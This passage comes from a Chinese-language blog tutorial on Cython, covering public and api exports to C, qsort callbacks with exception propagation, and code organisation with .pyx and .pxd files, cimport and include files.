class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//main.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Python.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"transcendentals.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    Py_Initialize();</div><div class="line">    inittranscendentals();</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"pi**e: %f\n"</span>, <span class="built_in">pow</span>(PI, get_e()));</div><div class="line">    Py_Finalize();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>编译运行过程：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">首先编译transcendentals.pyx代码生成transcendentals.c</span></div><div class="line"><span class="meta">$</span><span class="bash"> cython transcendentals.pyx</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash">然后编译我们的main.c代码</span></div><div class="line"><span class="meta">$</span><span class="bash"> gcc $(python-config --cflags) $(python-config --ldflags) transcendentals.c main.c</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash">然后运行结果</span></div><div class="line"><span class="meta">$</span><span class="bash"> ./a.out</span></div><div class="line">calling get_e()</div><div class="line">pi**e: 22.459157</div></pre></td></tr></table></figure></p><p>第二个机制是使用api关键字，它只能连接到C级别的函数和扩展类型。<br>例子如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cdef api double get_e():</div><div class="line">    <span class="keyword">print</span> <span class="string">"calling get_e()"</span></div><div class="line">    <span class="keyword">return</span> <span class="number">2.718281828</span></div></pre></td></tr></table></figure></p><p>api和public修饰符都可以运用于同一个对象。<br>和public关键字的使用方法类似，api关键字会导致cython编译器生成transcendentals_api.h头文件，它可以被外部的C代码使用，用来调用api声明的函数和方法的Cython代码。这种方法更灵活，它使用Python的导入机制动态地导入API声明的函数，而无需显式地编译扩展模块源或链接到动态库。唯一的要求是import_transcendentals应该在使用get_e()之前被调用。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//main.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"transcendentals_api.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    import_transcendentals();</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"e: %f\n"</span>, get_e());</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>注意，通过api关键字的方法并不能访问变量PI，我们应该通过函数来使用变量PI，api关键字只能访问函数和扩展类型。这是api机制通过动态运行时导入提供的灵活性的折中。</p><h2 id="错误检查并引发异常"><a href="#错误检查并引发异常" class="headerlink" title="错误检查并引发异常"></a>错误检查并引发异常</h2><p>外部C函数通过返回代码或错误标志来传递错误状态是很常见的。为了正确的包装这些函数，我们我们必须在包装函数中测试这些情况，并在发出错误时，显式地抛出一个Python异常。使用一个expect子句自动将C错误返回代码转换为Python异常是很方便的，但这样做是行不通的，这不是expect的目的。当一个外部的C函数设置C错误状态Cython不能自动检测。然而，expect子句可以和cdef回调结合使用。</p><h2 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h2><p>正如我们前面看到的，Cython支持C函数指针。使用此功能，我们可以包装C函数通过函数指针回调。回调可以是一个纯C函数，它不调用Python或C API，或者它可以调用任意的Python代码，这取决于用例。这个强大的特性允许我们传递运行时创建的Python函数来控制底层C函数的行为。跨语言的回调工作很复杂，特别是当它涉及到适当的异常处理。<br>具体细节不讲解，举例说明：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#想要包装C标准库中的qsort函数</span></div><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"stdlib.h"</span>:</div><div class="line">    void qsort(void *array, size_t count, size_t size, int (*compare)(const void *, const void *))</div><div class="line"></div><div class="line"><span class="comment">#我们创建pysort函数用来排序Python的数字序列，通过调用C的qsort和不同的比较函数</span></div><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"stdlib.h"</span>:</div><div class="line">    void *malloc(size_t size)</div><div class="line">    void free(void *ptr)</div><div class="line"></div><div class="line">ctypedef int (*qsort_cmp)(const void *, const void *)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pyqsort</span><span class="params">(list x, reverse=False)</span>:</span></div><div class="line">    cdef:</div><div class="line">        int *array</div><div class="line">        int i, N</div><div class="line">    <span class="comment">#分配C数组</span></div><div class="line">    N = len(x)</div><div class="line">    array = &lt;int*&gt;malloc(sizeof(int) * N)</div><div class="line">    <span class="keyword">if</span> array == NULL:</div><div class="line">        <span class="keyword">raise</span> MemoryError(<span class="string">"Unable to allocate array."</span>)</div><div class="line">    <span class="comment">#用Python数组填充C数组</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N):</div><div class="line">        array[i] = x[i]</div><div class="line"></div><div class="line">    cdef qsort_cmp cmp_callback</div><div class="line"></div><div class="line">    <span class="comment">#选择一个适当的回调函数</span></div><div class="line">    <span class="keyword">if</span> reverse:</div><div class="line">        cmp_callback = reverse_int_compare</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        cmp_callback = int_compare</div><div class="line">    <span class="comment">#调用qsort排序数组</span></div><div class="line">    qsort(&lt;void*&gt;array, &lt;size_t&gt;N, sizeof(int), cmp_callback)</div><div class="line">    </div><div class="line">    <span class="comment">#将结果转换成Python的序列类型，并释放资源</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N):</div><div class="line">        x[i] = array[i]</div><div class="line">    free(array)</div><div class="line"></div><div class="line"><span class="comment">#比较回调函数</span></div><div class="line">cdef int int_compare(const void *a, const void *b):</div><div class="line">    cdef int ia, ib</div><div class="line">    ia = (&lt;int*&gt;a)[<span class="number">0</span>]</div><div class="line">    ib = (&lt;int*&gt;b)[<span class="number">0</span>]</div><div class="line">    <span class="keyword">return</span> ia - ib</div><div class="line"></div><div class="line"><span class="comment">#逆向比较回调</span></div><div class="line">cdef int reverse_int_compare(const void *a, const void *b):</div><div class="line">    <span class="keyword">return</span> -int_compare(a, b)</div></pre></td></tr></table></figure></p><p>编译运行结果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> pyximport; pyximport.install()</div><div class="line">Out[<span class="number">1</span>]: (<span class="keyword">None</span>, &lt;pyximport.pyximport.PyxImporter at <span class="number">0x101c7c650</span>&gt;)</div><div class="line">In [<span class="number">2</span>]: <span class="keyword">from</span> pyqsort <span class="keyword">import</span> pyqsort</div><div class="line">In [3]: pyqsort?</div><div class="line">Type: builtin_function_or_method</div><div class="line">String Form:&lt;built-<span class="keyword">in</span> function pyqsort&gt;</div><div class="line">Docstring: &lt;no docstring&gt;</div><div class="line">In [<span class="number">4</span>]: <span class="keyword">from</span> random <span class="keyword">import</span> shuffle</div><div class="line">In [<span class="number">5</span>]: intlist = range(<span class="number">10</span>)</div><div class="line">In [<span class="number">6</span>]: shuffle(intlist)</div><div class="line">In [<span class="number">7</span>]: <span class="keyword">print</span> intlist</div><div class="line">[<span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">8</span>]</div><div class="line">In [<span class="number">8</span>]: pyqsort(intlist)</div><div class="line">In [<span class="number">9</span>]: <span class="keyword">print</span> intlist</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</div><div class="line">In [<span class="number">10</span>]: pyqsort(intlist, reverse=<span class="keyword">True</span>)</div><div class="line">In [<span class="number">11</span>]: <span class="keyword">print</span> intlist</div><div class="line">[<span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>]</div></pre></td></tr></table></figure></p><h2 id="回调和异常传播"><a href="#回调和异常传播" class="headerlink" title="回调和异常传播"></a>回调和异常传播</h2><p>到目前为止，任何cmp抛出的异常都会被忽略掉，为了解决这个限制，我们可以在声明cdef回调函数的使用使用except <em>语句，并且except </em>语句是函数声明的一部分，最终我们上面的qsort函数声明会变成下面这样：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"stdlib.h"</span>:</div><div class="line">    void qsort(void *array, size_t count, size_t size, int (*compare)(const void *, const void *) <span class="keyword">except</span> *)</div><div class="line"></div><div class="line">ctypedef int (*qsort_cmp)(const void *, const void *) <span class="keyword">except</span> *</div><div class="line"></div><div class="line">cdef int int_compare(const void *a, const void *b) <span class="keyword">except</span> *:</div><div class="line">    <span class="comment"># ...</span></div><div class="line"></div><div class="line">cdef int reverse_int_compare(const void *a, const void *b) <span class="keyword">except</span> *:</div><div class="line">    <span class="comment"># ...</span></div><div class="line"></div><div class="line">cdef int py_cmp_wrapper(const void *a, const void *b) <span class="keyword">except</span> *:</div><div class="line">    <span class="comment"># ...</span></div><div class="line"></div><div class="line">cdef int reverse_py_cmp_wrapper(const void *a, const void *b) <span class="keyword">except</span> *:</div></pre></td></tr></table></figure></p><p>因为我们使用了except *子句，每一次的回调之后都会检查异常，这就意味着将花费更多的开销，然而为此改进错误处理是值得的。</p></the></excerpt>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Cython </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第六章 组织Cython代码</title>
      <link href="/2017/08/16/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E7%BB%84%E7%BB%87Cython%E4%BB%A3%E7%A0%81/"/>
      <url>/2017/08/16/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E7%BB%84%E7%BB%87Cython%E4%BB%A3%E7%A0%81/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>组织Cython代码</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>Python提供了包和模块来帮我们组织项目，让项目代码更加容易理解和重用，在Python中我们可以使用import语句来访问函数，对象，类等其他包和模块中的内容。Cython也允许我们这样做，他完全的支持import语句，它允许我们在运行时访问定义在外部的纯Python模块中的对象或者定义在其他扩展模块中的Python可访问对象。但是Cython不允许Cython模块彼此其他的cdef或者cpdef函数，ctypedef或者struct，而且不允许C级别的代码访问其他的扩展模块。<br>为了解决这个问题，Cython提供了三种文件类型帮助组织包含部分Cython和C级别代码的项目。前面我们知道了Cython的源代码文件.pyx，它是实现文件（implementation files）；下面我们将看到这些文件如何和一个新的Cython文件类型一起工作，这些文件称为定义文件（definition files），后缀是.pyd;第三种Cython文件类型被称为包含文件（include files），后缀名是.pyi。<br>除了这三种文件类型，Cython有一个cimport语句，提供编译时访问C层面的结构的功能，它们会在定义文件（.pyd）中寻找这些结构。<br>本章我们将详细学习Cython的cimport语句和三种文件类型之间的关系。</p><h2 id="Cython的实现文件（-pyx）和定义文件（-pyd）"><a href="#Cython的实现文件（-pyx）和定义文件（-pyd）" class="headerlink" title="Cython的实现文件（.pyx）和定义文件（.pyd）"></a>Cython的实现文件（.pyx）和定义文件（.pyd）</h2><p>前面我们一直在使用Cython的实现文件（.pyx），里面的内容是Cython的源代码，但是如果我们需要共享其他的C级别的结构，我们需要创建一个定义文件（.pyd）。<br>有下面一个实现文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#simulator.pyx</span></div><div class="line">ctypedef double real_t</div><div class="line"></div><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">State</span>:</span></div><div class="line">    cdef:</div><div class="line">        unsigned int n_particles</div><div class="line">        real_t *x</div><div class="line">        real_t *vx</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__cinit__</span><span class="params">(...)</span>:</span></div><div class="line">        <span class="comment"># ...</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__dealloc__</span><span class="params">(...)</span>:</span></div><div class="line">        <span class="comment"># ...</span></div><div class="line">    cpdef real_t momentum(self):</div><div class="line">        <span class="comment"># ...</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(input_fname)</span>:</span></div><div class="line">    <span class="comment"># ...</span></div><div class="line"></div><div class="line">cpdef run(State st):</div><div class="line">    <span class="comment"># ...calls step function repeatedly...</span></div><div class="line"></div><div class="line">cpdef int step(State st, real_t timestep):</div><div class="line">    <span class="comment"># ...advance st one time step...</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">output</span><span class="params">(State st)</span>:</span></div><div class="line">    <span class="comment"># ...</span></div></pre></td></tr></table></figure></p><p>随着simulator.pyx的代码量的增加，维护将越来越困来，为了易于维护和模块化，我们需要将他拆分为逻辑组件。<br>我们首先创建一个simulator.pxd定义文件，在里面定义我们需要共享的C级别的结构，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#simulator.pxd</span></div><div class="line">ctypedef double real_t</div><div class="line"></div><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">State</span>:</span></div><div class="line">    cdef:</div><div class="line">        unsigned int n_particles</div><div class="line">        real_t *x</div><div class="line">        real_t *vx</div><div class="line">    </div><div class="line">    cpdef real_t momentum(self)</div><div class="line"></div><div class="line">cpdef run(State st)</div><div class="line"></div><div class="line">cpdef int step(State st, real_t timestep)</div></pre></td></tr></table></figure></p><p>因为定义文件是在编译时访问的，所以只能将C级别的声明放在里面。此时我们还需要修改实现文件simulator.pyx，因为他们在Cython的命名空间中有相同的名称，我们不能在实现文件中重复定义文件中的内容，这样做编译时会报错。我们的实现文件现在是这样的：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#simulator.pyx</span></div><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">State</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__cinit__</span><span class="params">(...)</span>:</span></div><div class="line">        <span class="comment"># ...</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__dealloc__</span><span class="params">(...)</span>:</span></div><div class="line">        <span class="comment"># ...</span></div><div class="line">    cpdef real_t momentum(self):</div><div class="line">        <span class="comment"># ...</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(input_fname)</span>:</span></div><div class="line">    <span class="comment"># ...</span></div><div class="line"></div><div class="line">cpdef run(State st):</div><div class="line">    <span class="comment"># ...calls step function repeatedly...</span></div><div class="line"></div><div class="line">cpdef int step(State st, real_t timestep):</div><div class="line">    <span class="comment"># ...advance st one time step...</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">output</span><span class="params">(State st)</span>:</span></div><div class="line">    <span class="comment"># ...</span></div></pre></td></tr></table></figure></p><p>ctypedef、cpdef函数和State的属性移动到了定义文件中，def函数和方法照旧。当编译simulator.pyx时，cython编译器会自动寻找simulator.pxd文件，使用里面的声明。<br>什么内容应该放在定义文件中？本质上讲，任何可以被其他Cython模块公开访问的C级别内容都应该放在定义文件中。<br>定义文件中包含下面内容：</p><ul><li>C类型的声明：ctypedef、struct、union或者enum</li><li>外部的C或者C++库的声明：cdef extern代码块</li><li>模块级别的cdef和cpdef函数的声明</li><li>cdef calss扩展类型的声明</li><li>扩展类型的cdef属性</li><li>cdef和cpdef方法的声明</li><li>C级别inline函数和方法的实现</li></ul><p>定义文件中不能包含的内容：</p><ul><li>Python的实现或者不是inline的C的方法和函数的实现</li><li>Python类的声明</li><li>除IF和DEF宏之外的Python可执行代码</li></ul><h2 id="cimport语句"><a href="#cimport语句" class="headerlink" title="cimport语句"></a>cimport语句</h2><p>假设现在有一个代码需要重用前面实现的simulator.pyx，我们可以这样写：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> simulator cimport State, step, real_t</div><div class="line"><span class="keyword">from</span> simulator <span class="keyword">import</span> setup <span class="keyword">as</span> sim_setup</div><div class="line"></div><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">NewState</span><span class="params">(State)</span>:</span></div><div class="line">    cdef:</div><div class="line">        <span class="comment"># ...extra attributes...</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__cinit__</span><span class="params">(self, ...)</span>:</span></div><div class="line">        <span class="comment"># ...</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__dealloc__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="comment"># ...</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(fname)</span>:</span></div><div class="line">    <span class="comment"># ...call sim_setup and tweak things slightly...</span></div><div class="line"></div><div class="line">cpdef run(State st):</div><div class="line">    <span class="comment"># ...improved run that uses simulator.step...</span></div></pre></td></tr></table></figure></p><p>第一句我们使用cimport语句导入扩展类型State，step cpdef函数和real_t ctypedef。在编译时访问C级别的代码，cimport会在simulator.pxd定义文件中寻找要导入的对象。然后第二行使用import语句访问setup def函数，import语句访问的Python级别的代码，在运行时导入。<br>cimport语句跟import语句的语法一样，可以使用cimport语句导入.pxd定义文件，使用它当做模块命名空间：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">cimport simulator</div><div class="line"></div><div class="line"><span class="comment"># ...</span></div><div class="line">cdef simulator.State st = simulator.State(params)</div><div class="line">cdef simulator.real_t dt = <span class="number">0.01</span></div><div class="line">simulator.step(st, dt)</div><div class="line"></div><div class="line"><span class="comment">#或者</span></div><div class="line">cimport simulator <span class="keyword">as</span> sim</div><div class="line"></div><div class="line"><span class="comment"># ...</span></div><div class="line">cdef sim.State st = sim.State(params)</div><div class="line">cdef sim.real_t dt = <span class="number">0.01</span></div><div class="line">sim.step(st, dt)</div><div class="line"></div><div class="line"><span class="comment">#或者</span></div><div class="line"><span class="keyword">from</span> simulator cimport State <span class="keyword">as</span> sim_state, step <span class="keyword">as</span> sim_step</div></pre></td></tr></table></figure></p><p>定义文件也可以包含cdef extern代码块，也可以只用cimport导入，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#_mersenne_twister.pxd</span></div><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"mt19937ar.h"</span>:</div><div class="line">    <span class="comment"># initializes mt[N] with a seed</span></div><div class="line">    void init_genrand(unsigned long s)</div><div class="line"></div><div class="line">    <span class="comment"># generates a random number on [0,0xffffffff]-interval</span></div><div class="line">    unsigned long genrand_int32()</div><div class="line"></div><div class="line">    <span class="comment"># generates a random number on [0,0x7fffffff]-interval</span></div><div class="line">    long genrand_int31()</div><div class="line"></div><div class="line">    <span class="comment"># generates a random number on [0,1]-real-interval</span></div><div class="line">    double genrand_real1()</div><div class="line"></div><div class="line">    <span class="comment"># generates a random number on [0,1)-real-interval</span></div><div class="line">    double genrand_real2()</div><div class="line"></div><div class="line">    <span class="comment"># generates a random number on (0,1)-real-interval</span></div><div class="line">    double genrand_real3()</div><div class="line"></div><div class="line">    <span class="comment"># generates a random number on [0,1) with 53-bit resolution</span></div><div class="line">    double genrand_res53()</div><div class="line"></div><div class="line"><span class="comment">#可以用下面方式导入使用</span></div><div class="line"><span class="keyword">from</span> _mersenne_twister cimport init_genrand, genrand_real3</div><div class="line"></div><div class="line"><span class="comment">#或者下面方式导入使用</span></div><div class="line">cimport _mersenne_twister <span class="keyword">as</span> mt</div><div class="line"></div><div class="line">mt.init_genrand(<span class="number">42</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</div><div class="line">    x[i] = mt.genrand_real1()</div></pre></td></tr></table></figure></p><h2 id="预定义的定义文件"><a href="#预定义的定义文件" class="headerlink" title="预定义的定义文件"></a>预定义的定义文件</h2><p>Cython预先定义了一些常用的C、C++和Python头文件，他们位于Cython源文件的Includes目录。其中C语言的标准库包libc，它包含stdlib、stdio、math、string和stdint的头文件的.pxd文件，还有常用的C++的标准模板库（STL）的定义文件包libcpp，比如string、vector、list、map、pair、set。Python方面，Cython源文件中有C头文件的.pxd，提供了从Cython简单的访问Python/C API的函数。最后一个声明包是numpy，它提供了访问Numpy/C的API。<br>具体看一些例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#通过cimport使用C标准库</span></div><div class="line"><span class="keyword">from</span> libc cimport math</div><div class="line">math.sin(<span class="number">3.14</span>)</div><div class="line"></div><div class="line"><span class="comment">#通过cimport导入具体的函数</span></div><div class="line"><span class="keyword">from</span> libc.math cimport sin</div><div class="line">sin(<span class="number">3.14</span>)</div><div class="line"></div><div class="line"><span class="keyword">from</span> libc.stdlib cimport rand, srand, qsort, malloc, free</div><div class="line">cdef int *a = &lt;int*&gt;malloc(<span class="number">10</span> * sizeof(int))</div><div class="line"></div><div class="line"><span class="keyword">from</span> libc.string cimport memcpy <span class="keyword">as</span> c_memcpy</div><div class="line"></div><div class="line"><span class="comment">#通过cimport导入C++的STL模板类</span></div><div class="line"><span class="keyword">from</span> libcpp.vector cimport vector</div><div class="line">cdef vector[int] *vi = new vector[int](<span class="number">10</span>)</div><div class="line"></div><div class="line"><span class="comment">#通过cimport和import导入相同的函数名，会产生编译错误，如下</span></div><div class="line"><span class="keyword">from</span> libc.math cimport sin</div><div class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sin</div><div class="line"></div><div class="line"><span class="comment">#可修改成下面这样</span></div><div class="line"><span class="keyword">from</span> libc.math cimport sin <span class="keyword">as</span> csin</div><div class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sin <span class="keyword">as</span> pysin</div><div class="line"></div><div class="line"><span class="comment">#但是导入相同名称的模块名是允许的，结果会调用C标准库的sin函数，所以通常还是建议将模块名通过as重命名</span></div><div class="line"><span class="comment"># compile-time access to functions from math.h</span></div><div class="line"><span class="keyword">from</span> libc cimport math</div><div class="line"><span class="comment"># runtime access to the math module</span></div><div class="line"><span class="keyword">import</span> math</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_sin</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="comment"># which `sin()` does this call?</span></div><div class="line">    <span class="keyword">return</span> math.sin(x)</div></pre></td></tr></table></figure></p><p>定义文件和C/C++的头文件有很多相似之处：</p><ul><li>他们都为了使用外部代码定义了C级别的结构</li><li>他们都允许我们将一个大文件拆分为多个组件</li><li>他们都定义了公共的C级别接口<br>C和C++访问头文件通过#include预处理指令，本质是对头文件包含文件的包含。Cython的cimport语句更加智能不容易出错，我们可以将它看做是编译时的import语句，和命名空间一起工作。<br>Cython的前身Pyrex，没有cimport语句，使用的是include实现对外部扩展源文件的引用，Cython目前也支持include语句，在一些项目中也有使用。</li></ul><h2 id="包含文件和包含语句"><a href="#包含文件和包含语句" class="headerlink" title="包含文件和包含语句"></a>包含文件和包含语句</h2><p>假设我们有一个扩展类型，想在所有的主流平台上使用，但是不同平台上的实现方式不同，可能是平台文件系统不兼容或者是平台的API不兼容等原因导致的，我们的目标是抽象这些差异，以透明的方式提供统一的接口。包含文件和include语句提供了一种方法来完成我们的平台兼容性问题的目标。<br>我们放置了三种不同平台的扩展类型的实现在三个.pxi文件中：linux.pxi、darwin.pxi和windows.pxi。三个文件中的一个将在编译中使用，为了将所有的都放在一起，另外一个interface.pyx文件有下面代码，使用IF编译时语句：<br><figure 